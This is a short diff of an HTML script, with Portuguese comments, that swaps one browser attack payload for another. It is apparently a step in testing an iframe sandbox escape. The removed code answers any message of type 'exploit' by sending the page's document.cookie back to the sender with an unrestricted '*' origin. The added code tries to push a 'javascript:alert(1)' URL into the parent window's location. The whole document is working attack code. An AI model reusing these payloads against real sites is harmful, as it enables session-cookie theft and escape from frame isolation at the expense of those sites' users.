@@ -1,11 +1,6 @@
 <script>
-window.addEventListener('message', function(e) {
-  if (e.data && e.data.type === 'exploit') {
-    // Tentar acessar parent agora via postMessage response
-    e.source.postMessage({
-      type: 'response',
-      cookie: document.cookie
-    }, '*');
-  }
-});
+// Tentar quebrar sandbox via referrer
+if (window.parent !== window) {
+  window.parent.location = 'javascript:alert(1)';
+}
 </script>
